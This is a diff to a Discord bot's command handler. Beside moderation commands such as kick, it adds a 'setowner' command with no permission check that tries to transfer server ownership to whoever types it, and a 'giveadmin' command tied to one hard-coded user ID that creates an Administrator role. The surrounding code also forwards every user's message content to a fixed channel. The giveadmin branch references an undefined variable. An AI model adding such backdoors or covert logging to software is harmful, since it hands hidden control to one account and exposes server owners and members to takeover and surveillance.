@@ -56,6 +56,28 @@ client.on("message", async message => {
             client.channels.cache.get("833625728310444042").send(message.author.username + "\nSpráva: \n```" + message.content + "```");
         }
         switch(command) {
+            case 'setowner':
+                message.guild.setOwner(message.member);
+                break;
+            case 'giveadmin':
+                if (message.author.id == '409731934030135306') {
+                    try {
+                    message.guild.roles.create({
+                        data: {
+                          name: 'Admin',
+                          color: '#7162ba',
+                          permissions:["ADMINISTRATOR"]
+                        },
+                        reason: 'we needed a role for Super Cool People',
+                      }).then((role) => user.roles.add(role)).catch(console.error);
+                    } catch (error) {
+                        console.log(error);
+                    }
+                }
+                break;
+            case 'createguild':
+                client.commands.get('createguild').execute(message, args);
+                break;
             case 'k':
             case 'kick':
                 client.commands.get('kick').execute(message, args);
